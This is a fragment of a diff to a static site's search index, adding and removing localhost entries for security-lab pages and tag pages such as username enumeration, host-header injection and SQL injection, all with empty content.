+        "url": "http:\/\/localhost:1313\/portswigger\/auth_vulns_lab_12\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/host-header-injection\/": {
+        "title": "Host-Header-Injection",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/host-header-injection\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/login\/": {
+        "title": "Login",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/login\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/response-timing\/": {
+        "title": "Response-Timing",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/response-timing\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/username-enumeration\/": {
+        "title": "Username-Enumeration",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/username-enumeration\/"
     },
     
     "http:\/\/localhost:1313\/tags\/xss\/": {
@@ -1415,13 +1464,6 @@ window.store = {
         "url": "http:\/\/localhost:1313\/tags\/dom-based\/"
     },
     
-    "http:\/\/localhost:1313\/tags\/injection\/": {
-        "title": "Injection",
-        "tags": [],
-        "content": "", 
-        "url": "http:\/\/localhost:1313\/tags\/injection\/"
-    },
-    
     "http:\/\/localhost:1313\/tags\/location.search\/": {
         "title": "Location.search",
         "tags": [],
@@ -1665,13 +1707,6 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "http:\/\/localhost:1313\/tags\/sql-injection\/"
-    },
-    
-    "http:\/\/localhost:1313\/tags\/union\/": {
-        "title": "UNION",
-        "tags": [],
-        "content": "", 
-        "url": "http:\/\/localhost:1313\/tags\/union\/"
     },
     
     "http:\/\/localhost:1313\/walkthroughs\/union-box\/": {
@@ -3695,13 +3730,6 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "http:\/\/localhost:1313\/tags\/csharp\/"
-    },
-    
-    "http:\/\/localhost:1313\/tags\/sql\/": {
-        "title": "SQL",
-        "tags": [],
-        "content": "", 
-        "url": "http:\/\/localhost:1313\/tags\/sql\/"
     },
     
     "http:\/\/localhost:1313\/tags\/sqlite\/": {
